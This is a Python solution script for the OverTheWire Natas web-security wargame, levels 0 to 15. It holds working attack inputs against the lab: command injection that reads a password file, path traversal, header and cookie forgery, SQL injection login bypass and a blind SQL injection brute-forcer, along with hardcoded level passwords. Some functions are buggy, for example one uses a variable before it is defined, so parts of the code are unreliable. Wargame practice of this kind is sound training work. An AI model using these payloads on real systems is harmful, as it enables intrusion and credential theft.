import requests, re

def natas0():
    url = 'https://overthewire.org/wargames/natas/natas0.html'
    resp = requests.get(url)
    r = "Password: \w+"
    passwd = re.findall(r,resp.text)[0]
    print(f"Level 0 {passwd}")
    print(resp.status_code)
    return passwd
natas0()

def natas1(): #prof
    url = 'http://natas0:natas0@natas0.natas.labs.overthewire.org/'
    resp = requests.get(url)
    r = "The password for natas\d+ is (\w{32})"
    passwd = re.findall(r,resp.text)[0]
    print(f"The password for level 1 is:{passwd}")
    print(resp.status_code)
    return passwd
passLvl1 = natas1()

def natas2(passLvl1): #prof
    url = f'http://natas1:{passLvl1}@natas1.natas.labs.overthewire.org/'
    resp = requests.get(url)
    r = "The password for natas\d+ is (\w{32})"
    passwd = re.findall(r,resp.text)[0]
    print(f"The password for level 2 is:{passwd}")
    print(resp.status_code)
    return passwd
natas2(passLvl1)

passLvl3 = 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14' # we didn't have to do 3.
def natas4(passLvl3):
    url = f'http://natas3:{passLvl3}@natas3.natas.labs.overthewire.org/s3cr3t/users.txt'
    resp = requests.get(url)
    r = 'natas\d+\:(\w{32})'
    passwd = re.findall(r,resp.text)[0]
    print(f"The password for level 4 is:{passwd}")
    print(resp.status_code)
    return passwd
passLvl4 = natas4(passLvl3)

def natas5(passLvl4):
    url = f'http://natas4:{passLvl4}@natas4.natas.labs.overthewire.org/'
    referToThis = 'http://natas5.natas.labs.overthewire.org/'
    resp = requests.get(url, headers={'referer': referToThis})
    r = 'The password for natas\d+ is (\w{32})'
    passwd = re.findall(r,resp.text)[0]
    print(f"The password for level 5 is:{passwd}")
    print(resp.status_code)
    return passwd
passLvl5 = natas5(passLvl4)

def natas6(passLvl5):
    url = f'http://natas5:{passLvl5}@natas5.natas.labs.overthewire.org/'
    changeLogInStatus = 'loggedin=1'
    resp = requests.get(url, headers={'Cookie': changeLogInStatus})
    r = 'The password for natas\d+ is (\w{32})'
    passwd = re.findall(r,resp.text)[0]
    print(f"The password for level 6 is:{passwd}")
    print(resp.status_code)
    return passwd
passLvl6 = natas6(passLvl5)

def natas7(passLvl6):
    url = f'http://natas6:{passLvl6}@natas6.natas.labs.overthewire.org/'
    secret = 'FOEIUWGHFEEUHOFUOIU' #found on /includes/secret.inc
    data = {'secret': secret,
            'submit':'submit'}
    resp = requests.post(url, data = data)
    r = 'The password for natas\d+ is (\w{32})'
    passwd = re.findall(r,resp.text)[0]
    print(f"The password for level 7 is:{passwd}")
    print(resp.status_code)
    return passwd
passLvl7 = natas7(passLvl6)

def natas8(passLvl7):
    url = f'http://natas7:{passLvl7}@natas7.natas.labs.overthewire.org/'
    resp = requests.get(url+'index.php?page=/etc/natas_webpass/natas8')
    r = '\w{32}'
    passwd = re.findall(r,resp.text)[1]
    print(f"The password for level 8 is:{passwd}")
    print(resp.status_code)
    return passwd
passLvl8 = natas8(passLvl7)

def natas9(passLvl8):
    url = f'http://natas8:{passLvl8}@natas8.natas.labs.overthewire.org/'
    encodedSec = '3d3d516343746d4d6d6c315669563362'
    # decode by ASCII to Hex = ==QcCtmMml1ViV3b,
    # then reverse the string = b3ViV1lmMmtCcQ==,
    # then base64 decoder = oubWYf2kBq 
    secret = 'oubWYf2kBq'
    data = {'secret': secret,
            'submit':'submit'}
    resp = requests.post(url, data = data)
    r = 'The password for natas\d+ is (\w{32})'
    passwd = re.findall(r,resp.text)[0]
    print(f"The password for level 9 is:{passwd}")
    print(resp.status_code)
    return passwd
passLvl9 = natas9(passLvl8)

def natas10(passLvl9): #had to cheat a little on what I needed to input
    url = f'http://natas9:{passLvl9}@natas9.natas.labs.overthewire.org/'
    input = '; cat /etc/natas_webpass/natas10 #' #makes sense
    data = {'needle': input,
            'submit':'submit'}
    resp = requests.post(url, data = data)
    r = '\w{32}'
    passwd = re.findall(r,resp.text)[1]
    print(f"The password for level 10 is:{passwd}")
    print(resp.status_code)
    return passwd
passLvl10 = natas10(passLvl9)


import base64
#passLvl11 = 'U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK'
def natas11(passLvl10):
    url = f'http://natas11:{passLvl10}@natas11.natas.labs.overthewire.org/'
    resp = requests.get(url)
    print(resp.status_code)
    cookie = resp.cookies['data']
    cookie = cookie[:-3]
    cookie = cookie + '='
        
    def xor(data, key):
        out = ''
        for i in range(len(data)):
            try:
                out += chr(data[i] ^ key[i%len(key)])
            except:
                pass
        return out

    encrypted = base64.b64decode(cookie)
    defaultdata = b'{"showpassword":"no", "bgcolor":"#ffffff"}'
    key = xor(encrypted, defaultdata)
    key = key[:4]

    editdata = b'{"showpassword":"yes", "bgcolor":"#ffffff"}'
    madeNewKey = bytes(key, "utf-8")
    xorCookie = xor(editdata, madeNewKey)
    
    byteCookie = bytes(xorCookie, "utf-8")
    newCookie = base64.b64encode(byteCookie)
    newCookie = newCookie.decode('utf-8')
    
    cookies = {'data': newCookie}
    resp = requests.get(url, cookies=cookies)
    
    reg = '\w{32}'
    passwd = re.findall(reg, resp.text)[1]
    print(f'Password obtained from level 11 is:{passwd}')
passLvl12 = natas11(passLvl10)


passLvl13 = 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'
def natas14(passLvl13):
    url = f'http://natas14:{passLvl14}@natas14.natas.labs.overthewire.org/'
    data = {'username':'" OR 1=1--',
            'password':'" OR 1=1--',
            'submit':'submit'}
    resp = requests.post(url, data = data)
    print(resp.status_code)
    reg = '\w{32}'
    passwd = re.findall(reg, resp.text)[1];
    print(f'Password obtained from level 14 is:{passwd}')
    return passwd
passLvl14 = natas14(passLvl13)


from requests.auth import HTTPBasicAuth
def natas15(passLvl14):
    url = 'http://natas15.natas.labs.overthewire.org/index.php?debug'
    trueStatement = 'This user exists.'
    chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    passwd = ''
    letters = ''

    #this for loop was added to make the blind brute force faster (idea from online)
    for x in chars: 
        user = f'natas16" AND password LIKE BINARY "%{x}%" "'
        data = {'username':user,
                'submit':'submit'}
        #I kept getting 401 codes so I found this below, got online
        auth=HTTPBasicAuth('natas15', passLvl14)   
        resp = requests.post(url, auth=auth, data=data)                        
        if resp.text.find(trueStatement) != -1:
            letters += x

    #this for loop does the blind brute forcing
    for i in range(32):
        for j in letters:
            user = f'natas16" AND password LIKE BINARY "{passwd}{j}%" "'
            data = {'username':user,
                    'submit':'submit'}
            #I kept getting 401 codes so I found this below, got online
            auth=HTTPBasicAuth('natas15', passLvl14)
            resp = requests.post(url, auth=auth, data=data)

            if resp.text.find(trueStatement) != -1:
                passwd += j
                break

    print(f'Password obtained from level 15 is:{passwd}')
natas15(passLvl14)